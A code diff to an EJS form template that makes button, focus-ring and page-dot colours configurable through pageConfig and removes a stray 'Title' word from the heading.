@@ -27,6 +27,20 @@
             filter: brightness(0.9);
         }
 
+        .focus-ring-custom:focus {
+            --tw-ring-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
+            border-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
+        }
+
+        .dot-active {
+            background-color: <%=pageConfig.buttonColor || '#3b82f6' %>;
+        }
+
+        .dot-inactive {
+            background-color: <%=pageConfig.textColor || '#111827' %>;
+            opacity: 0.3;
+        }
+
         .input-custom,
         input.input-custom {
             background-color: <%=pageConfig.inputBackgroundColor || 'transparent' %> !important;
@@ -74,7 +88,7 @@
                             <% } %>
 
                                 <h1 class="text-2xl font-bold text-center text-custom mb-2">
-                                    <%= pageConfig.title %> Title
+                                    <%= pageConfig.title %>
                                 </h1>
 
                                 <% if (pageConfig.subtitle) { %>
@@ -111,7 +125,7 @@
                                                                         inputmode="numeric"
                                                                         class="w-full px-4 py-3 border border-gray-300
                                                                         rounded-lg focus:outline-none focus:ring-2
-                                                                        focus:ring-blue-500 focus:border-transparent
+                                                                        focus-ring-custom focus:border-transparent
                                                                         text-center text-2xl tracking-widest
                                                                         <%= pageConfig.inputBackgroundColor==='transparent'
                                                                             ? '!bg-transparent' : '' %>
@@ -134,7 +148,7 @@
                                                                                         class="w-full px-4 py-3 border
                                                                                         border-gray-300 rounded-lg
                                                                                         focus:outline-none focus:ring-2
-                                                                                        focus:ring-blue-500
+                                                                                        focus-ring-custom
                                                                                         <%= pageConfig.inputBackgroundColor==='transparent'
                                                                                             ? '!bg-transparent' : '' %>
                                                                                             focus:border-transparent
@@ -161,7 +175,7 @@
                                                                     <input type="hidden" value="" name="ip" id="ip">
 
                                                                     <button type="submit" id="submitBtn"
-                                                                        class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200">
+                                                                        class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                                                                         <%= pageConfig.buttonText %>
                                                                     </button>
                                                         </form>
@@ -173,7 +187,7 @@
                                                                 <input type="hidden" value="" name="region" id="region">
                                                                 <input type="hidden" value="" name="ip" id="ip">
                                                                 <button type="submit" id="submitBtn"
-                                                                    class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200">
+                                                                    class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                                                                     <%= pageConfig.buttonText %>
                                                                 </button>
                                                             </form>
@@ -184,7 +198,7 @@
                                                                         <div class="flex gap-2">
                                                                             <% for (let i=1; i <=totalPages; i++) { %>
                                                                                 <div
-                                                                                    class="w-2 h-2 rounded-full <%= i === currentPage ? 'bg-gray-800' : 'bg-gray-300' %>">
+                                                                                    class="w-2 h-2 rounded-full <%= i === currentPage ? 'dot-active' : 'dot-inactive' %>">
                                                                                 </div>
                                                                                 <% } %>
                                                                         </div>
